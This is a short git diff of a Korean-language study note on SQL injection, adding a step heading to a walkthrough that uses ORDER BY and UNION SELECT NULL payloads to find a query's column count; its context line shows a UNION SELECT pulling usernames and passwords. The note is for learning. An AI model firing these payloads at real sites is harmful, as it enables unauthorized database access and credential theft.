@@ -151,7 +151,7 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 
 **실행흐름**
 1. 컬럼 개수 찾기\
-가장 많이 쓰이는 방법은 `ORDER BY` 임
+  가장 많이 쓰이는 방법은 `ORDER BY` 임
 ```
 ' ORDER BY 1 -- -
 ' ORDER BY 2 -- -
@@ -167,5 +167,7 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 ' UNION SELECT NULL, NULL, NULL -- -
 ```
 에러가 나지 않는 시점이 컬럼 개수임.
-또는 `UNION SELECT NULL, 1, NULL`
+
+2. 어느 컬럼이 화면에 출력되는지 확인\
+
 
